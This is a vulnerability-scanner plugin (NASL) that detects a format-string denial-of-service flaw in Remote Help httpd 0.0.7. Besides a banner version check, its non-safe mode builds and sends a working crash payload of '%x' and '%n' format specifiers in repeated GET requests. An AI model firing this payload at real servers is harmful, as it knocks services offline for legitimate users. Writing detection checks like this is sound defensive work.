# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100548");
  script_version("2023-10-27T16:11:32+0000");
  script_tag(name:"last_modification", value:"2023-10-27 16:11:32 +0000 (Fri, 27 Oct 2023)");
  script_tag(name:"creation_date", value:"2010-03-23 13:24:50 +0100 (Tue, 23 Mar 2010)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("Remote Help HTTP GET Request Format String Denial Of Service Vulnerability");
  script_category(ACT_MIXED_ATTACK);
  script_family("Denial of Service");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("httpd/banner");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/38875");
  script_xref(name:"URL", value:"http://www.corelan.be:8800/index.php/forum/security-advisories/remote-help-httpd-denial-of-service/");

  script_tag(name:"summary", value:"Remote Help is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"impact", value:"Remote attackers can exploit this issue to cause the application to
  crash, denying service to legitimate users. Due to the nature of this
  issue arbitrary code-execution may be possible, however this has not been confirmed.");

  script_tag(name:"affected", value:"Remote Help 0.0.7 is vulnerable, other versions may also be affected.");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");
include("version_func.inc");

port = http_get_port(default:80);

if( safe_checks() ) {

  banner = http_get_remote_headers( port:port );
  if( ! banner ) exit( 0 );

  if( "Server: httpd" >!< banner ) exit( 0 );

  version = eregmatch( pattern:"httpd ([0-9.]+)", string:banner );

  if( isnull( version[1] ) ) exit( 0 );

  if( version_is_equal( version:version[1], test_version:"0.0.7" ) ) {
    report = report_fixed_ver( installed_version:version[1], fixed_version:"None" );
    security_message( port:port, data:report );
    exit( 0 );
  }

  exit( 99 );

} else {

  if( http_is_dead( port:port, retry:4 ) ) exit( 0 );
  banner = http_get_remote_headers( port:port );
  if( "Server: httpd" >!< banner ) exit( 0 );

  data  = crap( data:"%x", length:90 );
  data += crap( data:"A" , length:250 );
  data += crap( data:"%x", length:186 );
  data += crap( data:"%.999999x", length:100 );

  payload = data + string( "%.199999x%nXDCBA" );

  url = string( "/index.html", payload );

  for( i = 0; i < 3; i++ ) {
    req = http_get( item:url, port:port );
    http_send_recv( port:port, data:req, bodyonly:TRUE );
    if( http_is_dead( port:port ) ) {
      security_message( port:port );
      exit( 0 );
    }
    sleep( 2 );
  }

  exit( 99 );

}

exit( 0 );
